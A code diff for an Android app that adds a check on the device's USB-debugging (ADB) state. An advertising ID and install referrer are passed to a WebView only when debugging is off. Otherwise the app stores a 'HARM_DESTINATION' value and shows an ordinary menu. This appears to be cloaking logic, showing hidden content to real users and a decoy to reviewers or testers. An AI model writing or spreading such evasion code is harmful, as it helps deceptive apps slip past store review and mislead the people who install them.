@@ -10,6 +10,7 @@ import android.view.KeyEvent
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import com.snapd.data.storage.EMPTY_DESTINATION
+import com.snapd.data.storage.HARM_DESTINATION
 import com.snapd.data.storage.SharedStorageImpl
 import com.snapd.databinding.ActivityUnoBinding
 import com.snapd.domain.models.EMPTY
@@ -53,13 +54,17 @@ class UnoActivity : AppCompatActivity() {
                     liveTrackState.collect{
                         if (it.gaid != EMPTY && it.ref != EMPTY && it.adbState != EMPTY){
                             //navigate to WebView
-                            val intentToThePolicy = Intent(this@UnoActivity, TresActivity::class.java)
 
-                            intentToThePolicy.putExtra(GAID, it.gaid)
-                            intentToThePolicy.putExtra(REFERRER, it.ref)
-                            intentToThePolicy.putExtra(ADB, it.adbState)
-
-                            startActivity(intentToThePolicy)
+                            if (it.adbState == "0"){
+                                val intentToThePolicy = Intent(this@UnoActivity, TresActivity::class.java)
+                                intentToThePolicy.putExtra(GAID, it.gaid)
+                                intentToThePolicy.putExtra(REFERRER, it.ref)
+                                intentToThePolicy.putExtra(ADB, it.adbState)
+                                startActivity(intentToThePolicy)
+                            } else {
+                                applicationStorage.saveDestination(HARM_DESTINATION)
+                                goToTheNextMenuActivity()
+                            }
                         }
                     }
                 }
